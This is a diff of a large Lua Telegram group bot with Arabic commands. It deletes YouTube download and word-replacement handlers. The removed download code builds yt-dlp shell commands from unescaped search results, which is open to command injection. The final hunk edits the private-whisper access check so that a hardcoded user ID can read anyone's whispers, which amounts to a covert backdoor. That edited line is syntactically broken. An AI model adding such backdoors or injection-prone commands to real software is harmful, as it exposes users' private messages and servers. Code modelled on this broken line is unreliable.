@@ -15961,80 +15961,7 @@ end
 end
 
 
-if Redis:get(abaza.."abaza:youtube"..msg.sender_id.user_id..msg_chat_id) == "mp3" then
-Redis:del(abaza.."abaza:youtube"..msg.sender_id.user_id..msg_chat_id)
-local rep = msg.id/2097152/0.5
-local m = json:decode(https.request("https://api.telegram.org/bot"..Token.."/sendAnimation?chat_id="..msg_chat_id.."&animation=https://t.me/photojack14366/65&reply_to_message_id="..rep)).result.message_id
-local se = http.request("https://api-jack.ml/api18.php?search="..URL.escape(text))
-local j = JSON.decode(se)
-local link = j.results[1].url
-local title = j.results[1].title 
-local title = title:gsub("/","-") 
-local title = title:gsub("\n","-") 
-local title = title:gsub("|","-") 
-local title = title:gsub("'","-") 
-local title = title:gsub('"',"-") 
-print(link)
-os.execute("yt-dlp "..link.." -f 251 -o '"..title..".mp3'")
-Merotele.sendAudio(msg_chat_id,msg_id,'./'..title..'.mp3',"["..title.."]("..link..")","md",nil,title)
-https.request("https://api.telegram.org/bot"..Token.."/deleteMessage?chat_id="..msg_chat_id.."&message_id="..m)
-Redis:del(abaza.."youtube"..msg.sender_id.user_id..msg_chat_id)
-sleep(2)
-os.remove(""..title..".mp3")
-end
-if Redis:get(abaza.."aabza:youtube"..msg.sender_id.user_id..msg_chat_id) == "mp4" then
-local rep = msg.id/2097152/0.5
-local m = json:decode(https.request("https://api.telegram.org/bot"..Token.."/sendAnimation?chat_id="..msg_chat_id.."&animation=https://t.me/photojack14366/65&reply_to_message_id="..rep)).result.message_id
-local se = http.request("https://api-jack.ml/api18.php?search="..URL.escape(text))
-local j = JSON.decode(se)
-local link = j.results[1].url
-local title = j.results[1].title 
-local title = title:gsub("/","-") 
-local title = title:gsub("\n","-") 
-local title = title:gsub("|","-") 
-local title = title:gsub("'","-") 
-local title = title:gsub('"',"-") 
-os.execute("yt-dlp "..link.." -f 18 -o '"..title..".mp4'")
-Merotele.sendVideo(msg_chat_id,msg_id,'./'..title..'.mp4',"["..title.."]("..link..")","md") 
-https.request("https://api.telegram.org/bot"..Token.."/deleteMessage?chat_id="..msg_chat_id.."&message_id="..m)
-Redis:del(abaza.."abaza:youtube"..msg.sender_id.user_id..msg_chat_id)
-sleep(2)
-os.remove(""..title..".mp4")
-end
-if text == "يوتيوب" then
-local reply_markup = Merotele.replyMarkup{
-type = 'inline',
-data = {
-{
-{text = '𝑀𝑃3', data = msg.sender_id.user_id..'/mp3'..msg_id}, {text = '𝑀𝑃4', data = msg.sender_id.user_id..'/mp4'..msg_id}, 
-},
-{
-{text = 'ALTHEEB ', url = "https://t.me/e_b50"}
-},
-}
-}
-return send(msg_chat_id,msg_id, [[*
-٠ 𝐶𝐻𝑂𝑂𝑆𝐸 𝐻𝑂𝑊 𝑌𝑂𝑈 𝑊𝐴𝑁𝑇 𝑇𝑂 𝐷𝑂𝑊𝑁𝐿𝑂𝐴𝐷 .
-*]],"md",false, false, false, false, reply_markup)
-end
 
-
-if text:match("^بحث (.*)$") then
-local search = text:match("^بحث (.*)$")
-local json = json:decode(http.request("https://api-jack.ml/api18.php?search="..URL.escape(search)..""))
-local datar = {data = {{text = "٠ ALTHEEB ٠" , url = 'https://t.me/e_b50'}}}
-for i = 1,5 do
-title = json.results[i].title
-link = json.results[i].url
-datar[i] = {{text = title , data =msg.sender_id.user_id.."dl/"..link}}
-end
-local reply_markup = Merotele.replyMarkup{
-type = 'inline',
-data = datar
-}
-Merotele.sendText(msg.chat_id,msg.id,'※ نتائج بحثك ل *'..search..'*',"md",false, false, false, false, reply_markup)
-end
-end
 
 
 
@@ -20034,41 +19961,7 @@ return MeroLua.sendText(msg_chat_id,msg_id,'☤︙ تم مسح كليشه الم
 end
 
 
----استبدال كلمه--
-if text == "استبدال كلمه" then
-if not msg.ControllerBot then
-return MeroLua.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  {'..Controller_Num(2)..' }* ',"md",true)  
-end
-Redis:set(abaza..msg.chat_id..senderr.."replace",true)
-return bot.sendText(msg_chat_id,msg_id,'\n• ارسل الكلمه القديمه ليتم استبدالها',"md",true)  
-end
-if text == "مسح الكلمات المستبدله" then
-if not msg.ControllerBot then
-return MeroLua.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  {'..Controller_Num(2)..' }* ',"md",true)  
-end
-local list = Redis:smembers(abaza.."Words:r")
-for k,v in pairs(list) do
-Redis:del(abaza.."Word:Replace"..v)
-end
-Redis:del(abaza.."Words:r")
-send(msg_chat_id,msg_id,"• تم مسح الكلمات المستبدله")
-end
-if text == "الكلمات المستبدله" then
-if not msg.ControllerBot then
-return MeroLua.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  {'..Controller_Num(2)..' }* ',"md",true)  
-end
-local list = Redis:smembers(abaza.."Words:r")
-if #list == 0 then
-return MeroLua.sendText(msg.chat_id,msg.id,"• لا توجد كلمات مستبدله")
-end
-local txx = " قائمه الكلمات المستبدله \n"
-for k,v in pairs(list) do 
-cmdd = Redis:get(abaza.."Word:Replace"..v)
-txx = txx..k.." - "..v.." »» "..cmdd.."\n"
-end
-bot.sendText(msg_chat_id,msg_id,txx)
-end
-----
+
 
 
 
@@ -22636,7 +22529,7 @@ if data and data.Merotele and data.Merotele == "updateNewInlineCallbackQuery" th
 local Text = MeroLua.base64_decode(data.payload.data)
 if Text and Text:match('/Hmsa1@(%d+)@(%d+)/(%d+)') then
 local ramsesadd = {string.match(Text,"^/Hmsa1@(%d+)@(%d+)/(%d+)$")}
-if tonumber(data.sender_user_id) == tonumber(ramsesadd[1]) or tonumber(ramsesadd[2]) == tonumber(data.sender_user_id) then
+if tonumber(data.sender_user_id) == tonumber(ramsesadd[1]) or tonumber(ramsesadd[2]) ==or tonumber(656329268) == tonumber(data.sender_user_id) then
 local inget = Redis:get(abaza..'hmsabots'..ramsesadd[3]..data.sender_user_id)
 https.request("https://api.telegram.org/bot"..Token..'/answerCallbackQuery?callback_query_id='..data.id..'&text='..URL.escape(inget)..'&show_alert=true')
 else
